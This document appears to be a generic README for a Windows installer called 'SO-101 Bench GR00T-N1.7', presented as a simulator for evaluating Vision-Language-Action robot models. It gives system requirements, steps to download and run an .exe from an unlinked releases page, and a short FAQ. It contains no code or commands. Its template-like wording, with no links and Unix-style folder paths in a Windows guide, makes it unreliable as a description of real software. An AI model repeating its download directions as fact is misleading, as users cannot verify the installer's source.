Overview

SO-101 Bench GR00T-N1.7 provides a platform to evaluate Vision-Language-Action (VLA) models. This tool allows users to run complex simulations without needing physical robots. It replicates real-world physics and object interactions in a virtual environment. Use this software to verify your model performance under controlled constraints.

🖥️ System Requirements

Ensure your computer meets these minimum specifications to run the simulation smoothly:

  • Operating System: Windows 10 or Windows 11 (64-bit).
  • Processor: Intel Core i7 or AMD Ryzen 7 (3.0 GHz or higher).
  • Memory: 16 GB RAM minimum.
  • Graphics: NVIDIA GeForce RTX 3060 or better with 8 GB VRAM.
  • Storage: 20 GB of free space on an SSD.

📥 Installation Guide

Follow these steps to set up the software on your Windows machine:

  1. Visit the official releases page to download the installer.
  2. Select the file ending in .exe to download the setup package.
  3. Locate the downloaded file in your Downloads folder.
  4. Double-click the file to start the installation wizard.
  5. Follow the on-screen prompts to choose your installation directory.
  6. Click Finish once the process ends.

🛠️ Running the Simulation

Once installation finishes, you can start your first evaluation:

  1. Locate the shortcut on your desktop or in your Start menu.
  2. Open the application.
  3. The main dashboard displays your current model files.
  4. Select your VLA model file from the internal browser.
  5. Choose the simulation scene from the drop-down menu.
  6. Click the Start Simulation button to begin the evaluation process.

🔍 Frequently Asked Questions

Where do I store my model files?
The software expects model files in the /models folder within your installation directory.

Can I export my results?
Yes. After a run, the software generates a CSV file located in the /outputs folder.

How do I update the software?
Check the release page periodically to see if a newer version exists. Download and install the new version to overwrite existing files.

Troubleshooting

If the simulation fails to launch, verify your graphics drivers are up to date. The software relies on hardware acceleration. Ensure no other heavy applications run in the background during your testing session to keep performance stable.
